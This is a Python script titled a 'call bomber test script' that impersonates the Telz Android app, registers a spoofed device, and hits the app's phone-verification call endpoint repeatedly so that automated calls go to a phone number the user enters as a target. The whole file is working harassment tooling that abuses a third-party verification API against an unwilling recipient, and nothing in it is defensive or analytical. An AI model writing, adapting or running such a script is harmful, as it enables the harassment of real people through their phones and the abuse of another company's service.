import requests
import json
import time
import uuid

class TelzClient:
    base_url = "https://api.telz.com/"
    headers = {
        'User-Agent': "Telz-Android/17.5.33",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json; charset=UTF-8"
    }
    
    def __init__(self):
        self.android_id = uuid.uuid4().hex[:16]
        self.app_version = "17.5.33"
        self.os_type = "android"
        self.os_version = "15"
        self.uuid = str(uuid.uuid4())
        self.session = requests.Session()
    
    def _post(self, endpoint, data):
        url = self.base_url + endpoint
        data.update({
            "android_id": self.android_id,
            "app_version": self.app_version,
            "os": self.os_type,
            "os_version": self.os_version,
            "ts": int(time.time() * 1000),
            "uuid": self.uuid
        })
        response = self.session.post(url, data=json.dumps(data), headers=self.headers, timeout=10)
        return response.json()

def main():
    print("=" * 40)
    print("🔥 TELZ CALL BOMBER TEST SCRIPT 🔥")
    print("=" * 40)
    
    phone_input = input("Enter target phone number (e.g., 9876543210): ").strip()
    
    # Format phone number
    if len(phone_input) == 10:
        phone = "+91" + phone_input
    elif not phone_input.startswith("+"):
        phone = "+" + phone_input
    else:
        phone = phone_input

    print(f"\n[*] Target set to: {phone}")
    print("[*] Initializing client and registering device...")

    try:
        client = TelzClient()
        
        # 1. Auth list
        client._post("app/auth_list", {"event": "auth_list"})
        
        # 2. Run / Device Registration
        client._post("app/run", {
            "event": "run",
            "device_name": "Pixel-Test",
            "ipv4_address": "10.1.10.1",
            "ipv6_address": "FE80::1",
            "lang": "en",
            "network_country": "tr",
            "network_type": "4G",
            "roaming": "no",
            "root": "no",
            "run_id": "",
            "sim_country": "tr"
        })
        
        # 3. Validate Phone Number
        val_res = client._post("app/validate_phonenumber", {"event": "validate_phonenumber", "phone": phone, "region": "TR"})
        print(f"[*] Validation Response: {val_res}")

        print("\n[+] Starting Call Bombing loop (Total: 5 calls)...")
        
        for i in range(1, 6):
            print(f"[-] Sending Call {i}/5...")
            try:
                res = client._post("app/auth_call", {"event": "auth_call", "phone": phone, "attempt": "0", "lang": "en"})
                print(f"[+] Call {i} Sent Successfully! Response: {res}")
            except Exception as e:
                print(f"[x] Call {i} Failed: {e}")
            
            if i < 5:
                print("[*] Waiting 20 seconds cooldown before next call...")
                time.sleep(20)
                
        print("\n[✔] Bombing test completed!")

    except Exception as err:
        print(f"\n[❌ Critical Error]: {err}")

if __name__ == "__main__":
    main()
